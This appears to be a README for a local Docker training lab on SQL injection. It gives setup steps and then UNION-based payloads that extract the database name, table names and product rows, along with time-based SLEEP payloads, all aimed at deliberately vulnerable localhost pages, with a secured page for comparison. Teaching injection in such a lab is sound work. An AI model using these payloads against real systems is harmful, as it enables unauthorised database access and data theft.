
1- Set in File dbConnection.php the Source-Database (db or mariadb)

2-  select Directory Composetest and run:
 - docker-compose up -d 
 - run docker ps to see processes or open Docker Desktop


3- open phpmyadmin to see your entries and Schema MY_DATABASE from .txt Files in directory composetest

http://localhost:8091/index.php?route=/

4-  Test Injection and websites:

- call the Site: 
-http://localhost:8000/Views/samShopView.php 

- insert in search fieled : 
```Hammer``` 

- now try folowing:

``Hammer" Union Select 1, 2, Database()#``

``Hammer%" UNION SELECT Product_name, Price, Quantity FROM products -- %"%"``

``Hammer" Union Select 1, 2, table_name from information_schema.tables where table_schema = 'MY_DATABASE' #'%"``

- Secure :
  http://localhost:8000/Views/saveShopView.php


- Login View:

http://localhost:8000/Views/loginView.php

- Test it with correct data and incorrect data and check the results!



- With Time-Based-Injection test folowing:

http://localhost:8000/Views/timerIndex.php 

``1 AND SLEEP(5)=0;``

check the loading time and try to change 5 to 10 or 3. check the loading time 

- Test ID with Sleep get Message

http://localhost:8000/Views/indexView.php

test folowing
1 AND SLEEP(5)=0; #


MORE.....
